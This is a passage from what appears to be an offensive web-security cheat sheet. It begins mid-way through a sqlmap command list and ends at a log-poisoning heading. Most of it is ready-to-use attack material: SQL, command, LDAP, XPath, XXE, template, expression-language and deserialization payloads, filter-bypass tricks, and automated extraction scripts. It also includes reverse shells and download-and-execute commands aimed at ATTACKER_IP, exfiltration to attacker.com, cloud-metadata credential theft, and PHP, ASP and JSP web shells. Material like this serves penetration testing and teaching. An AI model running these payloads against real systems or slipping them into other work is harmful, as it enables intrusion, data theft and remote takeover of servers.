sqlmap -u "http://target.com/product.php?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/product.php?id=1" -D testdb --tables

# Enumerate columns
sqlmap -u "http://target.com/product.php?id=1" -D testdb -T users --columns

# Dump table
sqlmap -u "http://target.com/product.php?id=1" -D testdb -T users --dump

# Dump all databases
sqlmap -u "http://target.com/product.php?id=1" --dump-all

# Get current user
sqlmap -u "http://target.com/product.php?id=1" --current-user

# Get current database
sqlmap -u "http://target.com/product.php?id=1" --current-db

# Check if user is DBA
sqlmap -u "http://target.com/product.php?id=1" --is-dba

# List database users
sqlmap -u "http://target.com/product.php?id=1" --users

# Get password hashes
sqlmap -u "http://target.com/product.php?id=1" --passwords

# OS shell (requires privileges)
sqlmap -u "http://target.com/product.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/product.php?id=1" --sql-shell

# Read file
sqlmap -u "http://target.com/product.php?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "http://target.com/product.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Bypass WAF with tamper scripts
sqlmap -u "http://target.com/product.php?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/product.php?id=1" --tamper=space2comment,between,randomcase

# Common tamper scripts
# --tamper=apostrophemask  # Replaces ' with UTF-8
# --tamper=base64encode    # Base64 encoding
# --tamper=between         # Replaces > with NOT BETWEEN 0 AND #
# --tamper=charencode      # URL encodes characters
# --tamper=space2comment   # Replaces space with /**/

# Risk and level
sqlmap -u "http://target.com/product.php?id=1" --level=5 --risk=3

# Batch mode (no prompts)
sqlmap -u "http://target.com/product.php?id=1" --batch

# Verbose output
sqlmap -u "http://target.com/product.php?id=1" -v 3

# Save traffic to file
sqlmap -u "http://target.com/product.php?id=1" -t traffic.txt

# Use proxy
sqlmap -u "http://target.com/product.php?id=1" --proxy="http://127.0.0.1:8080"

# Tor usage
sqlmap -u "http://target.com/product.php?id=1" --tor --tor-type=SOCKS5

# Custom injection points
sqlmap -u "http://target.com/product.php" --data="id=1*&name=test"

# Cookie injection
sqlmap -u "http://target.com/page.php" --cookie="session=abc*123" --level=2

# Header injection
sqlmap -u "http://target.com/page.php" --headers="X-Forwarded-For: 1.1.1.1*"

# Second-order injection
sqlmap -u "http://target.com/register.php" --data="username=test&email=test@test.com" --second-url="http://target.com/profile.php"
```

### Related Topics for Further Study

- Second-order SQL injection techniques
- NoSQL injection (MongoDB, CouchDB, Redis)
- GraphQL injection attacks
- ORM injection vulnerabilities (Hibernate, Entity Framework)

### OS Command Injection

OS Command Injection occurs when untrusted input is passed to system shell commands without proper sanitization.

**Basic Command Injection Techniques**

**Command Separators**

```bash
# Semicolon (Unix/Windows)
; whoami

# Pipe (Unix/Windows)
| whoami

# AND operator (Unix/Windows)
& whoami
&& whoami

# OR operator (Unix)
|| whoami

# Command substitution (Unix)
`whoami`
$(whoami)

# Newline (Unix)
%0a whoami
\n whoami
```

**Testing for Command Injection**

```bash
# Time-based detection
; sleep 10
& ping -n 10 127.0.0.1

# Out-of-band detection (DNS)
; nslookup $(whoami).attacker.com
& nslookup %USERNAME%.attacker.com

# Error-based detection
'; invalid_command '
```

**Bypass Techniques**

**Space Filtering Bypass**

```bash
# Using $IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# Using brace expansion
{cat,/etc/passwd}

# Using tab
cat%09/etc/passwd

# Using redirections
cat</etc/passwd

# Variable expansion
X=$'cat\x20/etc/passwd'&&$X
```

**Keyword Filtering Bypass**

```bash
# Concatenation
c''at /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd

# Using wildcards
/bin/c?t /etc/passwd
/bin/c*t /etc/passwd
/???/c?t /???/p??s??

# Variable substitution
COMMAND=cat
$COMMAND /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Hex encoding
$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

**Slash/Path Filtering Bypass**

```bash
# Using environment variables
cat $HOME/../../../etc/passwd

# Current directory reference
cat .$(echo -e '\057')etc$(echo -e '\057')passwd

# Octal encoding
cat $(echo -e "\057etc\057passwd")

# Wildcard path traversal
cat /e??/p*wd
```

**Reverse Shell via Command Injection**

```bash
# Bash reverse shell
; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# NC reverse shell
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Python reverse shell
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# URL encoded for web injection
%3b%20bash%20-i%20%3e%26%20%2fdev%2ftcp%2fATTACKER_IP%2fPORT%200%3e%261

# Base64 encoded to bypass filters
; echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE= | base64 -d | bash
```

**Windows Command Injection**

```cmd
# Command separators
& whoami
&& whoami
| whoami
|| whoami

# PowerShell execution
& powershell -c whoami
& powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')

# Download and execute
& certutil -urlcache -f http://ATTACKER_IP/nc.exe nc.exe & nc.exe -e cmd.exe ATTACKER_IP PORT

# Bypass with environment variables
%COMSPEC% /c whoami
%SystemRoot%\system32\cmd.exe /c whoami
```

**Blind Command Injection Detection**

```bash
# Time-based (Unix)
; sleep 10
`sleep 10`
$(sleep 10)

# Time-based (Windows)
& timeout 10
& ping -n 10 127.0.0.1

# DNS exfiltration
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com

# HTTP exfiltration
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(whoami)
```

**Automated Command Injection Testing**

```bash
# Using commix
commix --url="http://target.com/ping.php?ip=127.0.0.1"
commix --url="http://target.com/ping.php?ip=127.0.0.1" --data="ip=127.0.0.1"
commix --url="http://target.com/ping.php?ip=127.0.0.1" --os-shell

# Custom Python script
python3 << 'EOF'
import requests
import urllib.parse

target = "http://target.com/ping.php"
payloads = [
    "; whoami",
    "| whoami", 
    "& whoami",
    "&& whoami",
    "`whoami`",
    "$(whoami)"
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    response = requests.get(f"{target}?ip=127.0.0.1{encoded}")
    if "root" in response.text or "www-data" in response.text:
        print(f"[+] Vulnerable to: {payload}")
        print(f"    Response: {response.text[:200]}")
EOF
```

### LDAP Injection

LDAP (Lightweight Directory Access Protocol) injection occurs when user input is used to construct LDAP queries without proper sanitization.

**LDAP Query Structure**

```ldap
# Basic LDAP filter syntax
(attribute=value)
(&(attribute1=value1)(attribute2=value2))  # AND
(|(attribute1=value1)(attribute2=value2))  # OR
(!(attribute=value))                        # NOT
```

**LDAP Injection Authentication Bypass**

```ldap
# Normal query
(&(username=admin)(password=secret))

# Injection payload - always true
username: admin)(&)
password: anything
# Results in: (&(username=admin)(&)(password=anything))

# Alternative bypass
username: *
password: *
# Results in: (&(username=*)(password=*))

# Comment out password check
username: admin)(|(password=*
password: ))
# Results in: (&(username=admin)(|(password=*))(password=)))

# Blind true condition
username: *)(uid=*))(|(uid=*
password: anything
```

**LDAP Enumeration**

```ldap
# Enumerate valid usernames
username: admin*
username: admi*
username: test*

# Extract attributes character by character
username: a*
username: ad*
username: adm*
# If response differs, character is correct

# Wildcard enumeration
username: *)(cn=*))%00
# Extract all users
```

**LDAP Injection Payloads**

```ldap
# Always true
*
*)(&
*))%00
admin)(&)
admin)(|(password=*)

# OR injection
*)(|(objectClass=*)
*)(|(cn=*))%00

# AND injection
*)(cn=admin)(&(password=*

# Boolean-based
user*    # Returns true if user exists
user1*   # Returns true if username starts with 'user1'
```

**Blind LDAP Injection Script**

```python
import requests
import string

def check_condition(payload):
    """Returns True if LDAP query succeeds"""
    url = "http://target.com/ldap_search"
    data = {"username": payload, "password": "test"}
    response = requests.post(url, data=data)
    return "success" in response.text.lower()

def extract_attribute(attr_name):
    """Extract attribute value character by character"""
    result = ""
    charset = string.ascii_letters + string.digits + "_-@."
    
    while True:
        found = False
        for char in charset:
            # Test if attribute starts with current result + char
            payload = f"admin)({attr_name}={result}{char}*"
            if check_condition(payload):
                result += char
                print(f"Found: {result}")
                found = True
                break
        
        if not found:
            break
    
    return result

# Extract mail attribute for admin user
email = extract_attribute("mail")
print(f"Extracted email: {email}")
```

**LDAP Special Characters**

```ldap
# Characters requiring escaping in LDAP
*  # Wildcard - matches any characters
(  # Start of filter
)  # End of filter
\  # Escape character
NUL # Null byte (%00)

# Escaped format
\2a  # *
\28  # (
\29  # )
\5c  # \
\00  # NUL
```

**LDAP Injection Testing Checklist**

```bash
# Test for LDAP injection
1. *
2. *)(uid=*))(|(uid=*
3. admin*)((|userPassword=*)
4. *)(objectClass=*))(&(objectClass=*
5. admin)(&)
6. *))%00
```

### XML/XPath Injection

XML injection exploits applications that parse XML data without proper validation. XPath injection targets XPath queries.

**Basic XML Structure**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>
        <username>admin</username>
        <password>secret</password>
        <role>administrator</role>
    </user>
</users>
```

**XXE (XML External Entity) Injection**

```xml
# Basic XXE - File disclosure
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>

# Windows file disclosure
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>

# PHP wrapper for base64 encoding
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
```

**Blind XXE - Out-of-Band Data Exfiltration**

```xml
# DTD hosted on attacker server (evil.dtd)
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

# Payload sent to target
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<user>
  <username>test</username>
</user>
```

**XXE to SSRF**

```xml
# Internal network scanning
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<data>&xxe;</data>

# Cloud metadata (AWS)
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>

# Azure metadata
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
]>
```

**XPath Injection**

**Normal XPath Query**

```xpath
//users/user[username='admin' and password='secret']
```

**XPath Injection Authentication Bypass**

```xpath
# Input in username field
admin' or '1'='1

# Resulting query
//users/user[username='admin' or '1'='1' and password='secret']
# Always returns true

# Comment out password check
admin' or '1'='1' or ''='

# Alternative bypass
' or 1=1 or ''='
```

**XPath Enumeration**

```python
# Blind XPath injection to extract data
import requests

def check_condition(injection):
    """Test if XPath condition is true"""
    url = "http://target.com/xpath_search"
    data = {"username": injection, "password": "test"}
    response = requests.post(url, data=data)
    return "success" in response.text

def extract_string(xpath_query):
    """Extract string value from XPath query"""
    result = ""
    position = 1
    
    while True:
        found = False
        for ascii_val in range(32, 127):
            char = chr(ascii_val)
            # Test if character at position matches
            injection = f"' and substring({xpath_query},{position},1)='{char}"
            
            if check_condition(injection):
                result += char
                print(f"Found: {result}")
                position += 1
                found = True
                break
        
        if not found:
            break
    
    return result

# Extract admin password
password = extract_string("//users/user[username='admin']/password")
print(f"Admin password: {password}")
```

**XPath Injection Payloads**

```xpath
# Authentication bypass
' or '1'='1
' or ''='
' or 1]%00
admin' or '1'='1' or 'a'='a

# Node enumeration
' or count(//*)>0 or ''='
' or count(//*)<100 or ''='

# Extract node names
' or name(//user[1])='user' or ''='
' or substring(name(//user[1]),1,1)='u' or ''='

# Extract values
' or substring(//user[1]/password,1,1)='a' or ''='
```

**Advanced XXE Techniques**

**XXE via SVG Upload**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20" font-size="20">&xxe;</text>
</svg>
```

**XXE via DOCX/XLSX**

[Inference] Office documents are ZIP archives containing XML files:

```bash
# Extract DOCX
unzip document.docx -d extracted/

# Modify XML file (e.g., word/document.xml)
# Add XXE payload
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

# Repackage
cd extracted/
zip -r ../modified.docx *
```

**XXE Error-Based Exploitation**

```xml
# Trigger error to display file contents
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

### Template Injection (SSTI)

Server-Side Template Injection occurs when user input is embedded into template engines without proper sanitization.

**Identifying Template Engines**

```bash
# Test basic math expressions
{{7*7}}           # Jinja2, Twig
${7*7}            # FreeMarker, Velocity, Thymeleaf
<%= 7*7 %>        # ERB (Ruby)
#{7*7}            # Thymeleaf
${{7*7}}          # Pug
{7*7}             # Smarty

# Expected output: 49
```

**Detection Payloads**

```python
# Polyglot payload for detection
${{<%[%'"}}%\.

# If rendered differently or causes error, likely vulnerable
```

**Jinja2 Template Injection (Python)**

**Basic RCE Payloads**

```python
# Access config object
{{config}}
{{config.items()}}

# List available objects
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}

# Get to os module
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

# Simpler payload (may vary by Python version)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Lipsum built-in
{{lipsum.__globals__['os'].popen('id').read()}}

# Cycler built-in
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Joiner built-in  
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

**Automated Subclass Finding**

```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
  {% endif %}
{% endfor %}
```

**Jinja2 Filter Bypass**

```python
# If 'config' is filtered
{{self._TemplateReference__context}}

# If '.' is filtered
{{''['__class__']['__mro__'][1]}}

# If '[' is filtered
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)}}

# Using request object
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
```

**Twig Template Injection (PHP)**

```php
# Basic RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Alternative
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

# Using setCache
{{_self.env.setCache("ftp://attacker.com:2121")}}{{_self.env.loadTemplate("backdoor")}}

# File read
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

**FreeMarker Template Injection (Java)**

```java
# Execute commands
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Alternative
<#assign classloader=object?class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}

# API built-in (if enabled)
<#assign uri=object?api.class.getResource("/").toURI()>
<#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
<#assign is=input?api.getInputStream()>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

**ERB Template Injection (Ruby)**

```ruby
# Basic RCE
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>

# File read
<%= File.open('/etc/passwd').read %>

# Reverse shell
<%= IO.popen('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').readlines() %>
```

**Velocity Template Injection (Java)**

```java
# RCE via Class
#set($e="")
#set($rt=$e.class.forName("java.lang.Runtime"))
#set($chr=$e.class.forName("java.lang.Character"))
#set($str=$e.class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

**Thymeleaf Template Injection (Java)**

```java
# SpringEL expression
${T(java.lang.Runtime).getRuntime().exec('id')}

# Alternative
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}

# Preprocessed expression
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

**SSTI Exploitation Script**

```python
import requests

url = "http://target.com/page"

# Jinja2 payloads
payloads = [
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}"
]

for payload in payloads:
    data = {"name": payload}
    response = requests.post(url, data=data)
    
    if "uid=" in response.text or "root" in response.text:
        print(f"[+] Successful payload: {payload}")
        print(f"    Response: {response.text[:500]}")
        break
```

### Expression Language Injection

Expression Language (EL) injection occurs in Java applications using JSP, JSF, or Spring frameworks.

**Java EL Injection Basics**

```java
# Basic syntax
${expression}
#{expression}

# Accessing objects
${applicationScope}
${sessionScope}
${requestScope}
${param.username}
```

**EL Injection RCE Payloads**

```java
# Runtime.exec()
${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")}

# ProcessBuilder
${pageContext.request.getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[1].newInstance("id").start()}

# Alternative Runtime
${Runtime.getRuntime().exec("id")}

# String array for command with arguments
${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(new String[]{"bash","-c","bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"})}
```

**Spring Expression Language (SpEL) Injection**

```java
# Basic RCE
#{T(java.lang.Runtime).getRuntime().exec('id')}

# ProcessBuilder
#{new java.lang.ProcessBuilder('id').start()}

# With String array
#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}

# Reverse shell
#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'})}

# File read
#{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())}
```

**OGNL (Object-Graph Navigation Language) Injection**

```java
# Basic RCE (Struts 2)
%{(#_='multipart/form-data').(#[email protected]@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}

# Simpler OGNL
@java.lang.Runtime@getRuntime().exec('id')
```

**JSP EL Injection**

```jsp
# Direct execution
${Runtime.getRuntime().exec("id")}

# Via reflection
${pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}

# Cookie-based injection
${cookie.userdata.value}
# If userdata cookie contains EL expression, it may be evaluated
```

**Blind EL Injection**

```python
import requests
import time

def check_sleep(payload):
    """Test if EL expression causes delay"""
    url = "http://target.com/page"
    data = {"input": payload}
    
    start = time.time()
    requests.post(url, data=data)
    elapsed = time.time() - start
    
    return elapsed > 5

# Test payloads
sleep_payloads = [
    "${Runtime.getRuntime().exec('sleep 5')}",
    "#{T(java.lang.Thread).sleep(5000)}",
    "${pageContext.request.getClass().forName('java.lang.Thread').getMethod('sleep',long.class).invoke(null,5000)}"
]

for payload in sleep_payloads:
    if check_sleep(payload):
        print(f"[+] Vulnerable to: {payload}")
```

### Code Injection

Code injection involves executing arbitrary code in the application's native language.

**PHP Code Injection**

```php
# eval() injection
eval($_GET['code']);
# Exploit: ?code=system('id');

# assert() injection (PHP 5/7)
assert($_GET['code']);
# Exploit: ?code=system('id')

# preg_replace() with /e modifier (deprecated)
preg_replace('/test/e', $_GET['code'], 'test');
# Exploit: ?code=system('id')

# create_function() injection
$func = create_function('', $_GET['code']);
# Exploit: ?code=system('id');
```

**PHP Code Injection Payloads**

```php
# Basic command execution
system('id');
passthru('id');
shell_exec('id');
exec('id');
`id`;

# File operations
file_get_contents('/etc/passwd');
readfile('/etc/passwd');
file('/etc/passwd');

# Reverse shell
$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");

# One-liner reverse shell for injection
system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"');
```

**Python Code Injection**

```python
# eval() injection
eval(user_input)
# Exploit: __import__('os').system('id')

# exec() injection
exec(user_input)
# Exploit: __import__('os').system('id')

# compile() + eval()
code = compile(user_input, '<string>', 'eval')
eval(code)
```

**Python Code Injection Payloads**

```python
# Command execution
__import__('os').system('id')
__import__('subprocess').call(['id'])
__import__('subprocess').Popen('id', shell=True)

# Reverse shell
__import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')

# Alternative with socket
__import__('socket'),__import__('subprocess'),__import__('os');s=__import__('socket').socket(__import__('socket').AF_INET,__import__('socket').SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));__import__('os').dup2(s.fileno(),0);__import__('os').dup2(s.fileno(),1);__import__('os').dup2(s.fileno(),2);p=__import__('subprocess').call(["/bin/sh","-i"])

# File read
__import__('os').popen('cat /etc/passwd').read()
open('/etc/passwd').read()
```

**JavaScript (Node.js) Code Injection**

```javascript
# eval() injection
eval(userInput)
# Exploit: require('child_process').exec('id')

# Function() constructor
new Function(userInput)()
# Exploit: return require('child_process').execSync('id').toString()

# setTimeout/setInterval with string
setTimeout(userInput, 0)
```

**Node.js Code Injection Payloads**

```javascript
# Command execution
require('child_process').exec('id')
require('child_process').execSync('id').toString()
require('child_process').spawn('id')

# Reverse shell
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')

# Alternative reverse shell
(function(){
    var net = require('net'),
    cp = require('child_process'),
    sh = cp.spawn('/bin/sh', []);
    var client = new net.Socket();
    client.connect(PORT, 'ATTACKER_IP', function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
})()

# File read
require('fs').readFileSync('/etc/passwd', 'utf8')
```

**Ruby Code Injection**

```ruby
# eval() injection
eval(params[:code])
# Exploit: system('id')

# instance_eval()
object.instance_eval(params[:code])

# class_eval()
String.class_eval(params[:code])
```

**Ruby Code Injection Payloads**

```ruby
# Command execution
system('id')
`id`
exec('id')
%x(id)
IO.popen('id').read

# Reverse shell
exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')

# File read
File.read('/etc/passwd')
IO.read('/etc/passwd')
```

**Pickle Deserialization (Python)**

[Unverified] Pickle deserialization can lead to arbitrary code execution:

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

# Serialize malicious object
payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload)
print(encoded)

# When application deserializes:
# pickle.loads(base64.b64decode(user_input))
# Code executes
```

**Java Deserialization**

```java
# ysoserial tool for generating payloads
java -jar ysoserial.jar CommonsCollections6 'id' | base64

# Use generated payload in serialized object parameter
# [Inference] Java deserialization vulnerabilities require specific gadget chains present in the application's classpath.

```bash
# Common ysoserial payloads
java -jar ysoserial.jar CommonsCollections1 'id' > payload.ser
java -jar ysoserial.jar CommonsCollections6 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"' | base64

# Test multiple gadget chains
for payload in CommonsCollections1 CommonsCollections6 Groovy1 Spring1; do
    echo "Testing $payload"
    java -jar ysoserial.jar $payload 'ping -c 1 attacker.com' | base64
done
```

**Polyglot Code Injection Payloads**

```bash
# Works in multiple contexts
';system('id');$a='
";system('id');$a="
`id`
$(id)
{{7*7}}${7*7}<%=7*7%>${{7*7}}
```

**Serialization Format Detection**

```python
import base64

def detect_serialization(data):
    """Identify serialization format"""
    try:
        decoded = base64.b64decode(data)
        
        # Java serialization
        if decoded.startswith(b'\xac\xed\x00\x05'):
            return "Java Serialization"
        
        # PHP serialization
        if decoded.startswith(b'O:') or decoded.startswith(b'a:'):
            return "PHP Serialization"
        
        # Python pickle
        if decoded.startswith(b'\x80'):
            return "Python Pickle"
        
        # .NET ViewState
        if decoded.startswith(b'/w'):
            return ".NET ViewState"
            
    except:
        pass
    
    return "Unknown"

# Usage
serialized_data = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="
print(detect_serialization(serialized_data))
```

**PHP Object Injection**

```php
# Vulnerable code
$obj = unserialize($_GET['data']);

# Magic methods that can be exploited
# __wakeup() - called on unserialize
# __destruct() - called on object destruction
# __toString() - called when object treated as string

# Example exploit class
class Evil {
    private $cmd;
    
    function __construct($cmd) {
        $this->cmd = $cmd;
    }
    
    function __destruct() {
        system($this->cmd);
    }
}

# Generate payload
$payload = serialize(new Evil('id'));
echo urlencode($payload);
# O:4:"Evil":1:{s:9:"Evilcmd";s:2:"id";}
```

**Advanced PHP Serialization**

```php
# POP (Property Oriented Programming) chain
# Chain together existing classes to achieve RCE

# Example vulnerable class
class FileHandler {
    private $file;
    
    function __destruct() {
        include($this->file);  # File inclusion
    }
}

class Logger {
    private $logfile;
    
    function __toString() {
        return file_get_contents($this->logfile);
    }
}

# Exploit chain
$logger = new Logger();
$logger->logfile = '/etc/passwd';

$handler = new FileHandler();
$handler->file = $logger;  # When __toString() called, reads file

echo serialize($handler);
```

**PHPGGC Tool Usage**

```bash
# Generate PHP gadget chains
phpggc -l  # List available gadgets

# Generate RCE payload for common frameworks
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 system id
phpggc Monolog/RCE1 system id

# URL encode output
phpggc Laravel/RCE1 system id | base64 | urlencode

# Output formats
phpggc -f Laravel/RCE1 system id  # Fast destruct
phpggc -b Laravel/RCE1 system id  # Base64 encoded
phpggc -u Laravel/RCE1 system id  # URL encoded
```

**.NET Deserialization**

```bash
# Using ysoserial.net
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "calc"

# Common formatters
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c id"
ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -c "cmd /c id"
ysoserial.exe -f ObjectStateFormatter -g WindowsIdentity -c "cmd /c id"

# ViewState exploitation
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c id" --validationalg="SHA1" --validationkey="<KEY>"
```

**Code Injection via Template Files**

```bash
# Upload malicious template file
# Example: Smarty template (.tpl)
{php}system($_GET['cmd']);{/php}

# Pug/Jade template
- var x = require('child_process').execSync('id').toString()
= x

# Handlebars template (with helper)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{lookup string.constructor.prototype.charAt 0}}
  {{/with}}
{{/with}}
```

**Server-Side Include (SSI) Injection**

```html
# Test for SSI
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="id" -->

# File inclusion
<!--#include file="/etc/passwd" -->
<!--#include virtual="/etc/passwd" -->

# Command execution
<!--#exec cmd="ls -la" -->
<!--#exec cgi="/bin/ls" -->

# Set variables
<!--#set var="cmd" value="id" -->
<!--#exec cmd="$cmd" -->
```

**Remote Code Execution via File Upload**

```php
# PHP web shell (minimal)
<?php system($_GET['cmd']); ?>

# PHP reverse shell (one-liner)
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>

# Obfuscated PHP shell
<?php $a='sys'.'tem';$a($_GET[0]); ?>

# PHP using preg_replace (old PHP)
<?php preg_replace('/.*/e','system($_GET[0])',''); ?>

# ASP web shell
<%@ Language=VBScript %>
<%response.write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll())%>

# ASPX web shell
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]); %>

# JSP web shell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Bypass File Upload Filters**

```bash
# Extension tricks
shell.php.jpg       # Double extension
shell.php%00.jpg    # Null byte (old PHP)
shell.php%0a.jpg    # Newline
shell.php;.jpg      # Semicolon
shell.php%20        # Trailing space
shell.php.           # Trailing dot (Windows)
shell.php::$DATA    # NTFS alternate data stream

# Case sensitivity
shell.PhP
shell.pHp
shell.PHp

# Content-Type manipulation
Content-Type: image/jpeg
# But actual content is PHP code

# Magic bytes prepending
GIF89a<?php system($_GET['cmd']); ?>

# Polyglot files
# Valid image AND valid code
```

**Log Poisoning for Code Injection**

```bash
# SSH log poisoning
